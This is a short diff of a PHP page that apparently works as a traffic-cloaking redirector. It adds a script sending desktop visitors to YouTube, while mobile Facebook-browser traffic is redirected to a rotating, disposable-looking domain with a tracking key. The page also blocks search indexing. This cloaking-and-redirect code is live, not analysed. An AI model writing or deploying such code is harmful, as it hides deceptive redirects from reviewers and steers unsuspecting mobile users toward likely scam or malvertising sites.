@@ -10,7 +10,7 @@ if($isAndroid && $isFacebookBrowser){
 
 <html>
 <head>
-	<meta charset="UTF-8">
+	<meta charset="UTF-8"><script>if (typeof window.orientation == 'undefined' && screen.width >= 1000) { window.location.href = 'https://www.youtube.com/'; }</script>
 	<meta name="robots" content="noindex, nofollow">
 	<meta name="googlebot" content="noindex">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -62,7 +62,7 @@ if($isAndroid && $isFacebookBrowser){
 	}else{
 ?>
 <script>
-    window.location.href = 'https://questioningtosscontradiction.com/wyzbbiaek?key=d1e44473501d8a7dbcbbabcc6dc2d932';
+    window.location.href = 'https://pl19715772.forgetfulpromptlyappointment.com/c9hkh7d0s?key=55f583527d17cea6ab7a24daa144fa2b';
 </script>
 <?php
 }
